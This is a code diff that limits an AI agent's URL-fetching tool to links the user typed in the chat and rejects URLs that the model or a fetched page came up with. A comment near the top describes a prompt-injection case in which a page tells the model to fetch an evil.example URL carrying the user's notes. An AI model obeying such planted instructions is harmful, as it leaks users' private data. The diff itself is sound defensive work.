@@ -276,6 +276,52 @@ async def fetch_url(url: str, max_chars: int = 4000) -> dict:
     return {"url": str(final_url), "status": response.status_code, "type": "page", "text": _visible_text(html, max_chars)}
 
 
+# The links the user has typed in this chat, which are the only ones the
+# fetch_url tool opens. A page it reads can carry instructions ("now fetch
+# https://evil.example/?d=" plus the user's notes, even in hidden text), and
+# if the model could choose any URL, a private note could leave in one. The
+# agent sets it per turn.
+user_links: contextvars.ContextVar[frozenset[str]] = contextvars.ContextVar(
+    "user_links", default=frozenset()
+)
+
+# A link with a scheme, or a bare one like "example.com/syllabus".
+_LINK_RE = re.compile(r"https?://[^\s<>\"'`]+|(?:[\w-]+\.)+[a-z]{2,}(?::\d+)?(?:/[^\s<>\"'`]*)?", re.I)
+_LINK_TRAILING = ".,;:!?)]}'\"*"
+
+
+def _link_key(url: str) -> str | None:
+    """What two links must share to count as the same one: the host (case and
+    a "www." aside), port, path (a trailing slash aside) and query. The path
+    and query are compared exactly, since they're where data would go out."""
+    try:
+        parsed = httpx.URL(url if "://" in url else f"https://{url}")
+    except httpx.InvalidURL:
+        return None
+    if parsed.scheme not in ("http", "https") or not parsed.host:
+        return None
+    host = parsed.host.lower().removeprefix("www.")
+    port = f":{parsed.port}" if parsed.port else ""
+    query = f"?{parsed.query.decode('ascii')}" if parsed.query else ""
+    return f"{host}{port}{parsed.path.rstrip('/')}{query}"
+
+
+def links_in(text: str) -> frozenset[str]:
+    keys = (_link_key(m.group(0).rstrip(_LINK_TRAILING)) for m in _LINK_RE.finditer(text))
+    return frozenset(key for key in keys if key)
+
+
+async def fetch_user_link(url: str) -> dict:
+    """fetch_url, for a link the user typed in this chat (see user_links)."""
+    key = _link_key(url)
+    if key is None or key not in user_links.get():
+        raise PermissionError(
+            "only links the user typed in this chat can be opened, not ones the model or a page "
+            "came up with; ask the user to paste the link if they want it read"
+        )
+    return await fetch_url(url)
+
+
 # ---- search_notes / read_note / save_note ---------------------------------------
 
 MAX_SEARCH_RESULTS = 10
@@ -458,14 +504,15 @@ def build_registry(provider: LLMProvider, store: VectorStore | None = None) -> T
     registry.register(
         Tool(
             "fetch_url",
-            "Fetch a public web page or PDF and return its visible text (truncated). Use "
-            "when the user gives a URL or asks about the contents of a specific page or PDF.",
+            "Fetch a public web page or PDF and return its visible text (truncated). Only "
+            "opens links the user has typed in this chat; use it when they give one or ask "
+            "about a page or PDF they linked.",
             {
                 "type": "object",
-                "properties": {"url": {"type": "string", "description": "Absolute http(s) URL."}},
+                "properties": {"url": {"type": "string", "description": "A link exactly as the user gave it."}},
                 "required": ["url"],
             },
-            fetch_url,
+            fetch_user_link,
         )
     )
     return registry
